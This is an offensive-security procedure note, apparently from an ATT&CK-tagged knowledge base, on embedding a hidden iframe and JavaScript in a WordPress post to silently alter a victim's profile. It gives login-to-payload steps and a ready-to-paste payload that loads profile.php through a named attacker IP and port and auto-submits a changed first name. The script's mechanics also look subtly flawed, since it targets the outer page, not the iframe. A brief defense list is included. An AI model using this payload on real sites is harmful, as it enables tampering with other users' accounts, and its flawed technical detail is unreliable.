---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567892
tags:
  - clickjacking
  - iframe
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:58.326Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Embed-Malicious-Iframe-in-WordPress-Post

## Summary

This procedure involves logging in as an editor and creating a post with unfiltered HTML containing a hidden iframe and JavaScript to manipulate the victim's profile.

## Description

Editors in WordPress can embed arbitrary HTML, including iframes without X-Frame-Options protection. The iframe loads /wp-admin/profile.php in the victim's session context, generating a fresh CSRF nonce, and JavaScript alters form fields (e.g., first name) and submits them. Use attacker's IP if proxying (e.g., http://159.65.157.23:9080).

## Requirements

1. Editor role credentials
2. Access to WordPress post editor
3. Knowledge of target profile URL

## Defense

Defensive measures and detection strategies:

- Enable X-Frame-Options: DENY header
- Filter HTML for non-admin roles
- Monitor posts for suspicious iframes

## Objectives

1. Embed hidden malicious payload
2. Target profile form fields
3. Prepare for automatic submission

## Instructions

### Step 1: Log In as Editor

**Context**: Authenticate with editor privileges.

Navigate to /wp-admin and log in.

### Step 2: Create New Post

**Context**: Access the post editor for HTML insertion.

Go to Posts > Add New, switch to Text/HTML mode.

### Step 3: Insert Malicious HTML

**Context**: Add iframe and JS payload.

Paste: <iframe src="http://159.65.157.23:9080/wp-admin/profile.php" style="display:none;"></iframe><script>document.querySelector('#first_name').value = 'hacked by rewanthcool'; document.querySelector('#submit').click();</script>

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[iframe]]
- [[JavaScript]]
